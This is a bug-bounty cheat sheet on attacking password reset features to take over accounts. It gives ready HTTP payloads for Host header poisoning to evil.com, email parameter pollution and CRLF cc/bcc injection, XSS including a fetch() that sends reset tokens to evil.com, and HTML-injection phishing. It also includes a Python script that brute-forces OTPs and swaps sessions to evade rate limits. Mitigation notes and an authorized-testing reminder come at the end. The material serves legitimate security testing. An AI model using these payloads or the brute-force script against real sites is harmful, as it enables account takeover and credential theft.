## 📋 Overview

Password reset functionality is one of the **highest-impact attack surfaces** in web applications. When implemented incorrectly, it can lead to **full Account Takeover (ATO)** without requiring the victim's original password. This guide compiles every known attack vector, bypass technique, and exploitation method for password reset vulnerabilities.

**Why it matters:**

- Pre-authentication attack (no login needed)
- Direct path to ATO
- Often overlooked by developers
- High severity bounties

---

## 🎯 Exploitation Methods

### 1. **Password Reset Token Leak via Referer Header**

**What happens:** When users click the reset link and then navigate to third-party sites (social media, analytics), the full reset URL (including token) leaks in the `Referer` header.

**Steps to exploit:**

1. Request password reset to your email
2. Click the reset link (DON'T change password yet)
3. Turn on Burp Suite interception
4. Click any external link on the page (Facebook, Twitter, etc.)
5. Check intercepted requests for `Referer` header
6. Look for token in: `Referer: https://target.com/reset?token=SECRET_TOKEN`

**Impact:** Attacker controlling the third-party site can capture reset tokens → ATO

---

### 2. **Host Header Poisoning**

**What happens:** Application uses the `Host` header to build password reset links. Attacker poisons it to redirect tokens to their server.

**Steps to exploit:**

1. Intercept password reset request in Burp
2. Try these header injections:

```http
POST /reset HTTP/1.1
Host: evil.com
X-Forwarded-Host: target.com

email=victim@mail.com
```

**Alternative bypasses:**

```http
Host: target.com
X-Forwarded-Host: evil.com
```

```http
Host: evil.com
Host: target.com
```

```http
Host: target.com
X-Forwarded-Server: evil.com
X-Host: evil.com
```

3. Victim receives link like: `https://evil.com/reset?token=SECRET`
4. Token sent to attacker's server → ATO

**Tool tip:** Use ngrok for attacker server

---

### 3. **Email Parameter Manipulation**

**What happens:** Adding attacker's email alongside victim's email sends reset link to both.

**Top 10 Modern Payloads:**

```http
# 1. Parameter pollution (HPP)
POST /reset
email=victim@mail.com&email=attacker@mail.com

# 2. Separator: Space
POST /reset
email=victim@mail.com%20attacker@mail.com

# 3. Separator: Pipe
POST /reset
email=victim@mail.com|attacker@mail.com

# 4. Separator: Comma
POST /reset
email=victim@mail.com,attacker@mail.com

# 5. CC injection (CRLF)
POST /reset
email=victim@mail.com%0a%0dcc:attacker@mail.com

# 6. BCC injection
POST /reset
email=victim@mail.com%0a%0dbcc:attacker@mail.com

# 7. JSON array
POST /reset
Content-Type: application/json

{"email":["victim@mail.com","attacker@mail.com"]}

# 8. Null byte separator
POST /reset
email=victim@mail.com%00attacker@mail.com

# 9. JSON nested array
POST /reset
{"email":"victim@mail.com","attacker@mail.com","token":"xxxxxxxxxx"}

# 10. No domain variant
POST /reset
email=victim
```

**Pro tip:** Use Burp's "Content Type Converter" extension to test JSON/XML variants

---

### 4. **Token/OTP Bruteforce**

**What happens:** Weak tokens (4-6 digits) without rate limiting can be bruteforced.

**Steps to exploit:**

1. Request password reset
2. Intercept OTP validation request
3. Send to Burp Intruder
4. Set payload position: `code=$OTP$`
5. Payload type: Numbers (000000-999999)
6. Use null payload for unlimited attempts

**Rate limit bypass:**

- Change session after every 5-10 attempts
- Use IP rotation (Burp extension: IP Rotator)
- Request new reset token between attempts

**Python automation example:**

```python
import requests
import random

headers = {"Cookie": "PHPSESSID=session_here"}
url = "http://target.com/reset_password.php"
logout = "http://target.com/logout.php"

attempts = 0
while True:
    otp = f"{random.randint(0, 9999):04}"
    data = {"recovery_code": otp}
    
    res = requests.post(url, data=data, headers=headers)
    
    if attempts == 8:
        requests.get(logout, headers=headers)  # New session
        requests.post(url, data={"email":"victim@mail.com"}, headers=headers)
        attempts = 0
    else:
        attempts += 1
        
    if "success" in res.text:
        print(f"[+] Valid OTP: {otp}")
        break
```

---

### 5. **Token Reuse / Non-Expiring Tokens**

**Scenario 1: Token doesn't expire after use**

1. Request password reset → save the link
2. Use the link to change password
3. Try using the SAME link again
4. If password changes again → vulnerability

**Scenario 2: Old tokens remain valid**

1. Request reset link #1 (don't use it)
2. Request reset link #2
3. Use link #2 to change password
4. Try link #1 → if still works, it's vulnerable

**Scenario 3: Token survives email change**

1. Request reset link (don't open)
2. Change account email
3. Use old reset link → if works, vulnerable

**Scenario 4: Token survives password change**

1. Request reset code via "forgot password"
2. Don't use the code
3. Login normally and change password in settings
4. Use the old reset code → if works, vulnerable

---

### 6. **Response Manipulation**

**What happens:** Client-side validation only. Attacker intercepts and modifies error responses to success.

**Steps to exploit:**

1. Enter wrong OTP/token
2. Intercept response in Burp
3. Change:

```http
HTTP/1.1 401 Unauthorized
{"message":"unsuccessful","statusCode":403}
```

To:

```http
HTTP/1.1 200 OK
{"message":"success","statusCode":200}
```

4. Forward → password reset succeeds

---

### 7. **Token Leak in Response Body**

**What happens:** Reset token returned directly in API response.

**Steps to exploit:**

1. Send password reset request
2. Check response body:

```http
POST /access/forgotPassword HTTP/1.1
{"email":"victim@mail.com"}

Response:
{
  "resetPasswordLink": "https://app.com/reset?token=SECRET_HERE",
  "message": "Email sent"
}
```

3. Use leaked token → ATO

---

### 8. **Using Attacker's Token on Victim's Email**

**What happens:** Token validation only checks format, not ownership.

**Steps to exploit:**

1. Request reset for YOUR email → get token
2. Intercept victim's reset request
3. Replace with:

```http
POST /reset
email=victim@mail.com&token=YOUR_TOKEN_HERE
```

4. If password changes → ATO

---

### 9. **Weak Token Generation**

**Check if tokens are predictable based on:**

- **Timestamp**: Request multiple resets, analyze pattern
- **User ID**: Tokens like `base64(userID + timestamp)`
- **Email hash**: MD5/SHA1 of email
- **Sequential**: Incrementing numbers

**Tool:** Burp Sequencer

1. Capture 100+ reset tokens
2. Analyze in Sequencer
3. Look for patterns/low entropy

**For UUID v1 tokens:**

- Use `guidtool` to extract timestamp/MAC
- Predict next tokens

---

### 10. **Arbitrary Password Reset via API Parameter Manipulation**

**What happens:** Change password endpoint accepts username/email without proper authorization.

**Steps to exploit:**

1. Login with your account
2. Go to "Change Password"
3. Intercept request:

```http
POST /api/changepass HTTP/1.1
{"email":"your@mail.com","password":"newpass123"}
```

4. Change email to victim's:

```http
{"email":"victim@mail.com","password":"newpass123"}
```

5. If succeeds → ATO without reset token

---

### 11. **Pre-Auth Password Reset via skipOldPwdCheck**

**What happens:** Endpoint allows password change without validating old password or reset token.

**Vulnerable pattern:**

```http
POST /hub/rpwd.php HTTP/1.1

action=change_password&user_name=admin&confirm_new_password=NewP@ss!
```

**Steps to exploit:**

1. Find password change endpoints
2. Look for actions like: `change_password`, `update_password`
3. Test without authentication/token
4. Include username + new password only

---

### 12. **Registration-as-Password-Reset (Upsert Attack)**

**What happens:** Signup endpoint updates existing users instead of rejecting duplicate emails.

**Steps to exploit:**

1. Find registration endpoint
2. Use victim's existing email:

```http
POST /api/v4/admin/doRegistrationEntries HTTP/1.1
{"email":"victim@mail.com","password":"hacked123"}
```

3. If registration succeeds → password overwritten → ATO

---

### 13. **IDOR in Password Reset**

**What happens:** User ID parameter can be manipulated.

**Steps to exploit:**

```http
POST /reset HTTP/1.1
id=1234&token=valid_token
```

Change to:

```http
id=5678&token=valid_token
```

If password resets for user 5678 → vulnerability

---

### 14. **XSS in Password Reset Form**

**What happens:** Email parameter reflected without sanitization.

**Payload:**

```http
POST /reset HTTP/1.1
email="<svg/onload=alert(1)>"@gmail.com
```

**Higher impact:** Use XSS to steal reset tokens:

```javascript
email="<img src=x onerror='fetch(`https://evil.com?token=${document.location.href}`)'>@gmail.com"
```

---

### 15. **HTML Injection in Reset Emails**

**What happens:** Attacker injects HTML in name field → phishing link in reset email.

**Steps to exploit:**

1. Register account with payload in name:

```html
First Name: <a href="https://evil.com/phish"><h1>Click here to reset password</h1></a>
```

2. Request password reset
3. Victim receives email with malicious link

---

## 🔥 High-Impact Checks

### **Quick Win Checklist:**

- [ ] Is token in URL leaked via `Referer` header?
- [ ] Can I add my email via parameter manipulation?
- [ ] Does token work after password change?
- [ ] Does token work after email change?
- [ ] Can I bruteforce 4-6 digit OTP?
- [ ] Is token predictable/sequential?
- [ ] Does response manipulation work?
- [ ] Is token returned in API response?
- [ ] Can I use my token on victim's email?
- [ ] Does Host header affect reset link?
- [ ] Can I change password via API without token?
- [ ] Does registration overwrite existing users?
- [ ] Can I enumerate valid users?
- [ ] Is there rate limiting?
- [ ] Does token expire (ever)?

---

## 🛡️ Mitigations (For Understanding Defenses)

**For developers (know thy enemy):**

1. **Token Security:**
    
    - Use cryptographically secure random tokens (32+ bytes)
    - Bind token to user session/IP
    - Expire tokens after 15-30 minutes
    - Invalidate ALL tokens after password change
    - One-time use only
2. **Host Header Protection:**
    
    - Whitelist allowed domains
    - Use `$_SERVER['SERVER_NAME']` not `$_SERVER['HTTP_HOST']`
    - Validate origin/referer headers
3. **Email Validation:**
    
    - Parse email strictly (no arrays, no separators)
    - Reject special characters in email field
    - Use prepared statements
4. **Rate Limiting:**
    
    - Max 3-5 reset requests per hour per email
    - Max 5 OTP attempts before lockout
    - Implement CAPTCHA after failed attempts
    - Track by IP + email combination
5. **Response Security:**
    
    - Never return token in response body
    - Server-side validation only
    - Don't reveal if email exists
6. **Referrer Policy:**
    
    - Set `Referrer-Policy: no-referrer` on reset pages
    - Use `<meta name="referrer" content="no-referrer">`

---

## 🚀 Pro Tips for Bug Hunters

**Methodology:**

1. Test with YOUR email first (safe testing)
2. Use Burp Collaborator to catch out-of-band token leaks
3. Check `gau`, `waybackurls` for leaked tokens in archives
4. Test mobile API endpoints (often less secure)
5. Look for GraphQL mutations related to password reset
6. Check WebSocket connections during reset flow
7. Test old API versions (`/api/v1/reset` vs `/api/v2/reset`)

**Tools:**

- Burp Suite (Intruder, Repeater, Sequencer)
- IP-Rotator extension
- Content Type Converter extension
- guidtool (for UUID analysis)
- ngrok (attacker server)

**Report Template Sections:**

- **Title:** Password Reset Token Leak via [Method]
- **Severity:** High/Critical
- **Steps to Reproduce:** (numbered steps)
- **PoC:** (screenshot + request/response)
- **Impact:** Account Takeover of any user
- **Mitigation:** (specific fix recommendation)

---

## 📚 References

- [Anugrah SR - 10 Password Reset Flaws](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
- [HackerOne Reports: 342693, 272379, 751581, 898841, 283550]
- [Acunetix - Password Reset Poisoning](https://www.acunetix.com/blog/articles/password-reset-poisoning/)
- [Medium - Password Reset Bugs Compilation](https://sm4rty.medium.com/hunting-for-bugs-in-password-reset-feature-2021-3def1b391bef)

---

**Remember:** Always test on authorized targets only. Every technique here can lead to **Account Takeover = Critical severity = $$$.** Stay focused, test systematically, and document everything. Happy hunting! 🎯🔥